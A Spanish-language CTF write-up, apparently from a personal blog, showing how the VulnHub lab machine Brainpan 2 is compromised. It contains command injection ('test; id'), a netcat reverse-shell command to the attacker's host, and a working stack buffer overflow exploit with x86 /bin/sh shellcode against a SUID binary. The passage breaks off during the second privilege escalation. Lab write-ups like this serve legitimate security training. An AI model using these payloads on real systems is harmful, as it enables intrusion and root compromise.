@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup VulnHub Brainpan 2</title>
+
+  <meta name="description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup VulnHub Brainpan 2">
+  <meta name="twitter:description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/otros/vulnhub.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup VulnHub Brainpan 2">
+  <meta property="og:description" content="Resolución de la máquina Brainpan 2 de la plataforma de VulnHub">
+  <meta property="og:image" content="/images/otros/vulnhub.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/vulnhub.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup VulnHub Brainpan 2" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/vulnhub" title="GatoGamer1155" class="blog-button">VulnHub</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-anansi">Shell - anansi</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+        <li><a href="#shell-puck">Shell - puck</a></li>
+        <li><a href="#shell-root2">Shell - root 2</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">VulnHub</h4>
+    <picture><img src="/images/otros/vulnhub.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Brainpan 2</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde solo vemos 2 puertos abiertos, <code class="language-plaintext highlighter-rouge">9999</code> y <code class="language-plaintext highlighter-rouge">10000</code> igual que en la maquina <a href="/vulnhub/brainpan1">brainpan 1</a></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.63  
+Nmap scan report for 192.168.100.63
+PORT      STATE    SERVICE
+9999/tcp  open     abyss
+10000/tcp open     snet-sensor-mgmt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la web del puerto <code class="language-plaintext highlighter-rouge">10000</code> encontramos una página sin nada realmente interesante</p>
+<a href="/vulnhub/brainpan2/1.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/1.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.63:10000/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.100.63:10000/FUZZ
+Total requests: 4715
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000855:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "bin"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/bin</code> de la web encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code> sin embargo al descargarlo vemos que no es un binario sino una simple <code class="language-plaintext highlighter-rouge">imagen</code></p>
+<a href="/vulnhub/brainpan2/2.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/2.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ file </span><span class="p">brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85", baseline, precision 8, 381x307, components 3  </span>
+</code></pre></div></div><br>
+
+<a href="/vulnhub/brainpan2/3.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/3.png"></p></div></a>
+
+<p class="plain-text">Al conectarnos con netcat al puerto <code class="language-plaintext highlighter-rouge">9999</code> nos devuelve el mismo banner de simplemente <code class="language-plaintext highlighter-rouge">2.0</code>, el programa nos dice que nos autentiquemos como <code class="language-plaintext highlighter-rouge">GUEST</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.63 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]  
+                             LOGIN AS GUEST                             
+
+                          >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de enviar <code class="language-plaintext highlighter-rouge">GUEST</code> nos otorga acceso que nos pide enviar <code class="language-plaintext highlighter-rouge">TELL ME MORE</code> para ver mas opciones, donde encontramos varias que llaman bastante la atencion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *                                
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
+    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
+                             *  *  *  *                                
+
+
+                          >> TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+
+                          >></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-anansi">
+<br><h3 class="post-title">Shell - anansi</h3><br>
+
+<p class="plain-text">Enviando <code class="language-plaintext highlighter-rouge">FILES</code> podemos ver los archivos como si estuvieramos ejecutando un <code class="language-plaintext highlighter-rouge">ls</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe  
+-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt  
+-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
+                          >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando el comando <code class="language-plaintext highlighter-rouge">VIEW</code> nos pide un archivo al cual probablemente hace un <code class="language-plaintext highlighter-rouge">cat</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> VIEW
+    ENTER FILE TO DOWNLOAD: /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	brainpan2
+
+# The following lines are desirable for IPv6 capable hosts  
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                          >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo a leer enviamos test y adjuntamos un <code class="language-plaintext highlighter-rouge">; id</code> para ejecutar otro comando, en el output podemos ver que ejecuta el comando como el usuario <code class="language-plaintext highlighter-rouge">anansi</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> VIEW
+    ENTER FILE TO DOWNLOAD: test; id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)  
+                          >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que ejecutamos comandos en <code class="language-plaintext highlighter-rouge">VIEW</code>, nos enviamos una reverse shell con <code class="language-plaintext highlighter-rouge">netcat</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">                          >> VIEW
+    ENTER FILE TO DOWNLOAD: test; netcat -e /bin/sh 192.168.100.85 443  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos una shell como el usuario <code class="language-plaintext highlighter-rouge">anansi</code> en nuestro listener de netcat que curiosamente pertenece al grupo <code class="language-plaintext highlighter-rouge">staff</code> que por ahora no nos sirve de nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.63 
+script /dev/null -c bash
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$ id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)  
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$ hostname -I
+192.168.100.63 
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">/opt/brainpan</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Buscando por ejecutables con privilegios <code class="language-plaintext highlighter-rouge">suid</code> encontramos uno personalizado que llama algo la atención, y es <code class="language-plaintext highlighter-rouge">msg_root</code> el cual pertenece al usuario y grupo root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /home/reynard/msg_root
+-rwsr-xr-x 1 root root 8999 Nov  6  2013 </span><span class="err">/home/reynard/msg_root</span><span class="p">  
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El programa pide como argumento un <code class="language-plaintext highlighter-rouge">usuario</code> y un <code class="language-plaintext highlighter-rouge">mensaje</code>, sin embargo incluso pasandole los <code class="language-plaintext highlighter-rouge">argumentos</code> no queda muy claro cual es su funcion o que hace</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root
+usage: msg_root username message
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root username message  
+Your message is message
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para decompilarlo y analizarlo mejor podemos enviarlo a nuestro equipo con <code class="language-plaintext highlighter-rouge">netcat</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 192.168.100.85 4444 < /home/reynard/msg_root  
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444 > msg_root
+Listening on 0.0.0.0 4444
+Connection received on 192.168.100.63  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> podemos decompilar el binario y ver su pseudocodigo escrito en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/vulnhub/brainpan2/4.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/4.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> comprueba que el programa reciba 2 <code class="language-plaintext highlighter-rouge">argumentos</code>, si pasa la comprobación llama a la función <code class="language-plaintext highlighter-rouge">get_name</code> pasandole los 2 argumentos recibidos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
+{
+  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o"><= </span><span class="mi">2</span><span class="p"> )
+  {
+    </span><span class="no">puts</span><span class="p">(</span><span class="s">"usage: msg_root username message"</span><span class="p">);
+    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
+  }
+  get_name((</span><span class="no">char </span><span class="o">*</span><span class="p">)argv[</span><span class="mi">1</span><span class="p">], (</span><span class="no">char </span><span class="o">*</span><span class="p">)argv[</span><span class="mi">2</span><span class="p">]);
+  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Resumiendo la función <code class="language-plaintext highlighter-rouge">get_name</code> recibe los argumentos, define un buffer de solo <code class="language-plaintext highlighter-rouge">10</code> bytes para el primero que es <code class="language-plaintext highlighter-rouge">username</code>, y despues dentro de un if usa la función <code class="language-plaintext highlighter-rouge">strcpy</code>, la cual es conocida por ser usada en programas vulnerable a Buffer Overflow</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="p">__cdecl </span><span class="na">get_name</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">param_1</span><span class="p">, </span><span class="no">char </span><span class="o">*</span><span class="am">param_2</span><span class="p">)  
+{
+  </span><span class="no">int </span><span class="p">len; </span><span class="c1">// eax
+  </span><span class="no">char </span><span class="p">username[</span><span class="mi">10</span><span class="p">];</span><span class="c1"> // [esp+Eh] [ebp-12h] BYREF
+  </span><span class="no">char </span><span class="o">*</span><span class="p">message;</span><span class="c1"> // [esp+18h] [ebp-8h]
+  </span><span class="no">void </span><span class="p">(</span><span class="o">*</span><span class="p">fp)(</span><span class="no">char </span><span class="o">*</span><span class="p">, </span><span class="no">char </span><span class="o">*</span><span class="p">); </span><span class="c1">// [esp+1Ch] [ebp-4h]
+
+  </span><span class="p">fp </span><span class="o">= </span><span class="p">save_msg;
+  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)</span><span class="no">strlen</span><span class="p">(param_1) </span><span class="o">> </span><span class="mi">17 </span><span class="p">)
+    </span><span class="no">strncpy</span><span class="p">(username, param_1, </span><span class="mi">18</span><span class="p">);
+  </span><span class="o">else</span><span class="p">
+    </span><span class="no">strcpy</span><span class="p">(username, param_1);
+  message </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">2000</span><span class="p">);
+  len </span><span class="o">= </span><span class="no">strlen</span><span class="p">(param_2);
+  </span><span class="no">strncpy</span><span class="p">(message, param_2, len);
+  save_message(username, message);
+  </span><span class="no">free</span><span class="p">(message);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">save_msg</code> simplemente guarda el mensaje en el archivo <code class="language-plaintext highlighter-rouge">/tmp/msg.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void </span><span class="p">__cdecl </span><span class="na">save_msg</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">username, </span><span class="no">char </span><span class="o">*</span><span class="p">message)  
+{
+  FILE </span><span class="o">*</span><span class="p">file; </span><span class="c1">// [esp+10h] [ebp-4h]
+
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Your message is </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">, message);
+  file </span><span class="o">=</span><span class="p"> (FILE </span><span class="o">*</span><span class="p">)</span><span class="no">fopen</span><span class="p">(</span><span class="s">"/tmp/msg.txt"</span><span class="p">,</span><span class="s"> "a"</span><span class="p">);
+  </span><span class="no">fprintf</span><span class="p">(file, </span><span class="s">"</span><span class="mi">%s</span><span class="s">:</span><span class="mi"> %s\n</span><span class="s">"</span><span class="p">, username, message);
+  </span><span class="no">fclose</span><span class="p">(file);
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /tmp/msg.txt  
+username: message
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+
+<p class="plain-text">Antes de explotar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> podemos ver las protecciones del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, no tiene ninguna habilitada lo que facilitara bastante la explotacion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">msg_root
+[</span><span class="az">*</span><span class="p">] '/home/kali/msg_root'
+    Arch:     i386-32-little
+    RELRO:    </span><span class="ro">No RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ro">NX disabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">  
+    RWX:      </span><span class="ro">Has RWX segments</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para buscar el offset podemos abrir <code class="language-plaintext highlighter-rouge">gdb</code> y crear un patron de caracteres de <code class="language-plaintext highlighter-rouge">20</code> bytes que pasaremos como el primer argumento <code class="language-plaintext highlighter-rouge">username</code> que es el vulnerable, en el segundo podemos enviar cualquier cosa, corremos el programa y este se corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q msg_root
+Reading symbols from </span><span class="ve">msg_root</span><span class="p">...
+</span><span class="ro">pwndbg> </span><span class="p">cyclic 20
+aaaabaaacaaadaaaeaaa
+</span><span class="ro">pwndbg> </span><span class="p">run aaaabaaacaaadaaaeaaa message
+Starting program: </span><span class="ve">/home/kali/msg_root </span><span class="p">aaaabaaacaaadaaaeaaa message
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x61656161 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con gdb buscamos el <code class="language-plaintext highlighter-rouge">offset</code> que son la cantidad de bytes necesarios antes de llegar a sobreescribir el registro <code class="language-plaintext highlighter-rouge">EIP</code> que espera la siguiente instruccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">cyclic -l $eip
+</span><span class="sa">Finding cyclic pattern of 4 bytes: b'aaea' (hex: 0x61616561)  
+</span><span class="ve">Found at offset 14
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque tenemos varias direcciones que llaman a <code class="language-plaintext highlighter-rouge">EAX</code> no podemos explotarlo de esa forma ya que tendriamos un espacio de solo <code class="language-plaintext highlighter-rouge">14</code> bytes para nuestro shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file msg_root --jmp eax  
+
+JMP Instructions
+================
+
+</span><span class="ro">0x080485a7</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
+</span><span class="ro">0x0804862f</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
+</span><span class="ro">0x0804872c</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
+</span><span class="ro">0x080488bf</span><span class="p">: </span><span class="am">jmp </span><span class="p">eax</span><span class="az">;
+</span><span class="p">
+4 gadgets found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo podemos apuntar a una direccion de una <code class="language-plaintext highlighter-rouge">variable</code> con el shellcode, para esto tendramos que compilar y subir un <code class="language-plaintext highlighter-rouge">compilado</code> que extraiga la direccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s https://raw.githubusercontent.com/intere/hacking/master/booksrc/getenvaddr.c -o getenvaddr.c  
+
+</span><span class="ve">❯ gcc </span><span class="p">-m32 getenvaddr.c -o getenvaddr -static
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ wget 192.168.100.85/getenvaddr
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ chmod +x getenvaddr 
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./getenvaddr 
+Usage: ./getenvaddr &ltenvironment variable> &lttarget program name>  
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos definiendo un <a href="https://www.exploit-db.com/shellcodes/13628">shellcode</a> en x86 que nos ejecute una <code class="language-plaintext highlighter-rouge">/bin/sh</code> al interpretarse en la variable <code class="language-plaintext highlighter-rouge">$SHELLCODE</code>, despues ejecutamos el compilado que nos pide el nombre de la varible y la ruta del binario a explotar, obtenemos la <code class="language-plaintext highlighter-rouge">direccion</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ export SHELLCODE=$(python2 -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')  
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ./getenvaddr SHELLCODE /home/reynard/msg_root
+SHELLCODE will be at 0xbffff9f8
+</span><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La idea sera rellenar con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">EIP</code>, y ahi enviar la direccion de la variable que contiene el <code class="language-plaintext highlighter-rouge">shellcode</code>, que al interpretarse nos dara una <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+<a href="/vulnhub/brainpan2/5.png" target="_blank"><div><p><img src="/vulnhub/brainpan2/5.png"></p></div></a>
+
+<p class="plain-text">Como estamos en little endian tenemos que darle la vuelta a la direccion <code class="language-plaintext highlighter-rouge">0xbffff9f8</code> en pares de 2 que quedaria como <code class="language-plaintext highlighter-rouge">\xf8\xf9\xff\xbf</code>, al explotar el Buffer Overflow obtenemos una shell como el propietario que es <code class="language-plaintext highlighter-rouge">root</code>, pero en un <code class="language-plaintext highlighter-rouge">$</code> en lugar de <code class="language-plaintext highlighter-rouge">#</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ /home/reynard/msg_root $(python2 -c 'print("A"*14 + "\xf8\xf9\xff\xbf")') message  
+$ whoami
+root
+$ hostname -I
+192.168.100.63 
+$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-puck">
+<br><h3 class="post-title">Shell - puck</h3><br>
+
+<p class="plain-text">Si intentamos leer la flag en el directorio <code class="language-plaintext highlighter-rouge">/root</code> nos devuelve permiso denegado y el archivo <code class="language-plaintext highlighter-rouge">whatif.txt</code> nos confirma con un mensaje que aun no somos el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$ cd /root
+$ ls -l
+-rw------- 1 root  root  461 Nov  5  2013 flag.txt  
+-rw------- 1 root  root  245 Nov  5  2013 whatif.txt  
+$ cat flag.txt
+cat: flag.txt: Permission denied
+$ cat whatif.txt
+
+       WHAT IF I TOLD YOU
+              ___
+            /     \ 
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.'
+      .---'`-.___|\___
+     /                `.
+
+       YOU ARE NOT ROOT?
+
+$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Filtrando por la cadena root en el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podemos encontrar a 2 usuarios <code class="language-plaintext highlighter-rouge">root</code> con el id <code class="language-plaintext highlighter-rouge">104</code> y <code class="language-plaintext highlighter-rouge">root </code> con un espacio que es el id <code class="language-plaintext highlighter-rouge">0</code> que queremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$ grep root /etc/passwd
+root:x:104:106:root:/root:/bin/bash  
+root :x:0:0:root:/var/root:/bin/bash  
+$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para evitar conflictos, con python haremos que nuestro <code class="language-plaintext highlighter-rouge">uid</code> y <code class="language-plaintext highlighter-rouge">gid</code> sea igual a <code class="language-plaintext highlighter-rouge">104</code>, despues nos lanzamos una <code class="language-plaintext highlighter-rouge">bash</code> que puede llegar a ser un poco mas interactiva</p>
